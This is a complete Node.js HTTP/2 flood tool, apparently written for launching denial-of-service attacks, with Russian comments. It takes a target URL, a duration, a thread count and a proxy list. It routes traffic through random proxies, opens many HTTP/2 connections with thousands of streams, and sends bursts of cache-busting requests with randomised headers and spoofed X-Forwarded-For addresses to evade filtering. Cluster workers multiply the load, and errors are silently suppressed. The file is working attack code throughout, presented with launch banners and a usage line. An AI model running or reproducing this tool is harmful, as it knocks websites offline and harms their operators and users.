const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");

// ========== АГРЕССИВНЫЕ НАСТРОЙКИ HTTP/2 ==========
const AGGRESSIVE_CIPHERS = [
  'TLS_AES_128_GCM_SHA256',
  'TLS_AES_256_GCM_SHA384',
  'TLS_CHACHA20_POLY1305_SHA256',
  'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
  'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
  'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
].join(':');

const AGGRESSIVE_SECURE_OPTIONS = 
  crypto.constants.SSL_OP_ALL |
  crypto.constants.SSL_OP_NO_COMPRESSION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1;

const AGGRESSIVE_HTTP2_SETTINGS = {
  headerTableSize: 65536,
  enablePush: false,
  initialWindowSize: 6291456,      // 6MB окно для агрессивной отправки
  maxFrameSize: 16777215,          // Максимальный размер фрейма
  maxHeaderListSize: 262144,       // Большие заголовки
  maxConcurrentStreams: 10000,     // Максимальное количество потоков
  enableConnectProtocol: false
};

const ATTACK_CONFIG = {
  requestInterval: 25,             // 25ms между пачками запросов
  burstSize: 100,                  // 100 запросов за раз
  maxRetries: 3,
  connectionTimeout: 3000,         // 3 секунды на подключение
  maxConnectionsPerWorker: 50,     // 50 соединений на воркер
  maxStreamsPerConnection: 1000    // 1000 потоков на соединение
};

// ========== ГЛОБАЛЬНЫЕ КОНСТАНТЫ ==========
const referrers = [
  'https://google.com/search?q=',
  'https://youtube.com/watch?v=',
  'https://facebook.com/profile.php?id=',
  'https://twitter.com/home',
  'https://reddit.com/r/',
  'https://github.com/',
  'https://stackoverflow.com/questions/'
];

const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "application/json, text/plain, */*"
];

const cache_header = ['no-cache', 'no-store', 'must-revalidate'];
const language_header = [
  'en-US,en;q=0.9,ru;q=0.8,kk;q=0.7',
  'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,kk;q=0.6',
  'kk-KZ,kk;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6'
];

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const encoding_header = [
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity'
];

// ========== СИСТЕМНЫЕ ОПТИМИЗАЦИИ ==========
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = Infinity;
require("http").globalAgent.maxSockets = Infinity;
require("https").globalAgent.maxSockets = Infinity;

// ========== УТИЛИТЫ ==========
function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(p => p.trim());
}

function getRandomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function generateRandomString(min, max, charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') {
  const length = Math.floor(Math.random() * (max - min + 1)) + min;
  const bytes = crypto.randomBytes(length);
  let result = '';
  for (let i = 0; i < length; i++) {
    result += charset[bytes[i] % charset.length];
  }
  return result;
}

// ========== КЛАСС ДЛЯ МНОГОПОТОЧНОЙ АТАКИ ==========
class ParallelAttacker {
  constructor(target, proxies, userAgents, workerId) {
    this.target = target;
    this.parsedTarget = url.parse(target);
    this.proxies = proxies;
    this.userAgents = userAgents;
    this.workerId = workerId;
    
    this.activeConnections = new Set();
    this.stats = {
      totalRequests: 0,
      successfulRequests: 0,
      failedRequests: 0,
      activeConnections: 0,
      requestsPerSecond: 0,
      lastUpdate: Date.now()
    };
    
    this.attackWorkers = [];
    this.isRunning = false;
  }
  
  // Создание одного HTTP/2 соединения
  async createHttp2Connection(proxy) {
    return new Promise((resolve, reject) => {
      const proxyParts = proxy.split(':');
      const proxyHost = proxyParts[0];
      const proxyPort = parseInt(proxyParts[1]) || 80;
      
      // CONNECT через прокси
      const proxySocket = net.connect({
        host: proxyHost,
        port: proxyPort,
        timeout: ATTACK_CONFIG.connectionTimeout
      });
      
      const connectPayload = `CONNECT ${this.parsedTarget.host}:443 HTTP/1.1\r\nHost: ${this.parsedTarget.host}:443\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n`;
      
      proxySocket.on('connect', () => {
        proxySocket.write(connectPayload);
      });
      
      proxySocket.on('data', (data) => {
        if (data.toString().includes('HTTP/1.1 200')) {
          // TLS поверх прокси
          const tlsOptions = {
            socket: proxySocket,
            host: this.parsedTarget.host,
            port: 443,
            servername: this.parsedTarget.host,
            ALPNProtocols: ['h2', 'http/1.1'],
            ciphers: AGGRESSIVE_CIPHERS,
            secureProtocol: 'TLSv1_2_method',
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            secureOptions: AGGRESSIVE_SECURE_OPTIONS,
            rejectUnauthorized: false,
            ecdhCurve: 'X25519:P-256:P-384:P-521',
            honorCipherOrder: false
          };
          
          const tlsSocket = tls.connect(tlsOptions);
          
          tlsSocket.on('secureConnect', () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
              tlsSocket.destroy();
              proxySocket.destroy();
              reject(new Error('No HTTP/2 support'));
              return;
            }
            
            // Агрессивный HTTP/2 клиент
            const client = http2.connect(this.target, {
              createConnection: () => tlsSocket,
              settings: AGGRESSIVE_HTTP2_SETTINGS
            });
            
            client.setMaxListeners(0);
            
            // Обработчики для клиента
            client.on('goaway', () => {
              this.activeConnections.delete(client);
              client.destroy();
            });
            
            client.on('close', () => {
              this.activeConnections.delete(client);
            });
            
            client.on('error', () => {
              this.activeConnections.delete(client);
            });
            
            this.activeConnections.add(client);
            resolve(client);
          });
          
          tlsSocket.on('error', reject);
        } else {
          proxySocket.destroy();
          reject(new Error('Proxy connection failed'));
        }
      });
      
      proxySocket.on('error', reject);
      proxySocket.on('timeout', () => {
        proxySocket.destroy();
        reject(new Error('Proxy timeout'));
      });
    });
  }
  
  // Генерация рандомных заголовков
  generateHeaders() {
    const randomQuery = generateRandomString(15, 30);
    const referrer = getRandomElement(referrers) + generateRandomString(5, 15);
    
    return {
      ":authority": this.parsedTarget.host,
      ":scheme": "https",
      ":path": (this.parsedTarget.path || "/") + "?v=" + Date.now() + "&q=" + randomQuery,
      ":method": "GET",
      "pragma": "no-cache",
      "upgrade-insecure-requests": "1",
      "Accept": getRandomElement(accept_header),
      "Accept-Encoding": getRandomElement(encoding_header),
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control": "no-cache, no-store, must-revalidate",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "cross-site",
      "Sec-Fetch-Dest": "document",
      "User-Agent": getRandomElement(this.userAgents),
      "Sec-Ch-Ua-Platform": '"Windows"',
      "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
      "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
      "Referer": referrer,
      "DNT": "1",
      "TE": "trailers"
    };
  }
  
  // Атака через одно соединение
  async attackWithConnection(http2Client) {
    let requestCount = 0;
    let isActive = true;
    
    const attackInterval = setInterval(() => {
      if (!isActive || http2Client.destroyed) {
        clearInterval(attackInterval);
        return;
      }
      
      // Отправка пачки запросов
      for (let i = 0; i < ATTACK_CONFIG.burstSize; i++) {
        try {
          const headers = this.generateHeaders();
          const req = http2Client.request(headers, {
            weight: 256,
            exclusive: false
          });
          
          requestCount++;
          this.stats.totalRequests++;
          
          req.on('response', () => {
            this.stats.successfulRequests++;
            req.close();
          });
          
          req.on('error', () => {
            this.stats.failedRequests++;
          });
          
          req.end();
        } catch (e) {
          this.stats.failedRequests++;
        }
      }
      
      // Обновляем RPS каждую секунду
      const now = Date.now();
      if (now - this.stats.lastUpdate >= 1000) {
        this.stats.requestsPerSecond = requestCount;
        requestCount = 0;
        this.stats.lastUpdate = now;
        this.stats.activeConnections = this.activeConnections.size;
      }
    }, ATTACK_CONFIG.requestInterval);
    
    return {
      stop: () => {
        isActive = false;
        clearInterval(attackInterval);
      },
      getStats: () => ({ requestCount })
    };
  }
  
  // Запуск одного атакующего воркера
  async startAttackWorker(workerId) {
    console.log(`[Worker ${this.workerId}:${workerId}] Starting attack worker`.yellow);
    
    while (this.isRunning) {
      try {
        // Выбираем случайный прокси
        const proxy = getRandomElement(this.proxies);
        
        // Создаем HTTP/2 соединение
        const http2Client = await this.createHttp2Connection(proxy);
        console.log(`[Worker ${this.workerId}:${workerId}] Connection established`.green);
        
        // Запускаем атаку через это соединение
        const attack = await this.attackWithConnection(http2Client);
        
        // Ждем случайное время перед созданием нового соединения
        await new Promise(resolve => {
          setTimeout(() => {
            attack.stop();
            http2Client.destroy();
            resolve();
          }, 30000 + Math.random() * 30000); // 30-60 секунд
        });
        
      } catch (error) {
        // В случае ошибки ждем немного и пробуем снова
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }
  }
  
  // Запуск многопоточной атаки
  async startParallelAttack(numWorkers = 5) {
    this.isRunning = true;
    
    console.log(`[Worker ${this.workerId}] Starting ${numWorkers} parallel attack workers`.green);
    
    // Запускаем несколько атакующих воркеров
    for (let i = 0; i < numWorkers; i++) {
      this.startAttackWorker(i).catch(console.error);
      
      // Задержка между запуском воркеров
      if (i < numWorkers - 1) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }
    
    // Статистика
    setInterval(() => {
      console.log(`[Worker ${this.workerId}] Stats: ${this.stats.totalRequests} req | ${this.stats.successfulRequests} ok | ${this.stats.failedRequests} err | ${this.stats.activeConnections} conn | ${this.stats.requestsPerSecond} rps`.cyan);
    }, 2000);
  }
  
  // Остановка атаки
  stop() {
    this.isRunning = false;
    this.activeConnections.forEach(client => client.destroy());
    this.activeConnections.clear();
  }
}

// ========== ОСНОВНОЙ КОД ==========
if (process.argv.length < 7) {
  console.log(`Usage: host time req thread proxy.txt`);
  process.exit();
}

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
var UAs = fs.readFileSync('user-agents.txt', 'utf-8').replace(/\r/g, '').split('\n');
const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
  console.clear();
  console.log(`╔══════════════════════════════════════════════╗`.brightBlue);
  console.log(`║   MULTI-THREADED HTTP/2 ATTACK LAUNCHED     ║`.brightBlue);
  console.log(`╚══════════════════════════════════════════════╝`.brightBlue);
  console.log(`\nTarget: ${args.target}`.cyan);
  console.log(`Duration: ${args.time}s | Rate: ${args.Rate} | Threads: ${args.threads}`.cyan);
  console.log(`Proxies: ${proxies.length} | User Agents: ${UAs.length}\n`.cyan);
  
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    console.log('[>] Restarting the script', RESTART_DELAY, 'ms...'.yellow);
    setTimeout(() => {
      for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
      }
    }, RESTART_DELAY);
  };

  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%'.red);
      restartScript();
    }
  };
  
  setInterval(handleRAMUsage, 5000);
  
  // Запускаем воркеры
  for (let counter = 1; counter <= args.threads; counter++) {
    const worker = cluster.fork({ workerId: counter });
    
    worker.on('message', (msg) => {
      if (msg.type === 'stats') {
        console.log(`[Worker ${msg.workerId}] ${msg.totalRequests} req | ${msg.rps} rps`.gray);
      }
    });
  }
  
  // Общая статистика
  let totalStats = {
    requests: 0,
    workers: args.threads
  };
  
  setInterval(() => {
    console.log(`\n${'='.repeat(50)}`.gray);
    console.log(`Total Requests Sent: ${totalStats.requests.toLocaleString()}`.green);
    console.log(`Active Workers: ${Object.keys(cluster.workers).length}`.green);
    console.log(`${'='.repeat(50)}\n`.gray);
  }, 5000);
  
  // Автоматическое завершение
  setTimeout(() => {
    console.log('\n' + '='.repeat(50).brightYellow);
    console.log('ATTACK COMPLETED'.brightGreen);
    console.log('='.repeat(50).brightYellow);
    
    // Останавливаем всех воркеров
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    
    setTimeout(() => process.exit(0), 1000);
  }, args.time * 1000);
  
} else {
  // Код для воркеров
  const workerId = process.env.workerId || 1;
  
  console.log(`[Worker ${workerId}] Starting with ${proxies.length} proxies`.yellow);
  
  // Создаем многопоточного атакующего
  const attacker = new ParallelAttacker(args.target, proxies, UAs, workerId);
  
  // Запускаем параллельную атаку (5 атакующих потоков на каждый воркер)
  attacker.startParallelAttack(5);
  
  // Отправка статистики в мастер
  setInterval(() => {
    if (process.send) {
      process.send({
        type: 'stats',
        workerId: workerId,
        totalRequests: attacker.stats.totalRequests,
        rps: attacker.stats.requestsPerSecond
      });
    }
  }, 2000);
  
  // Остановка по таймауту
  setTimeout(() => {
    console.log(`[Worker ${workerId}] Stopping attack`.yellow);
    attacker.stop();
    process.exit(0);
  }, args.time * 1000);
}

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});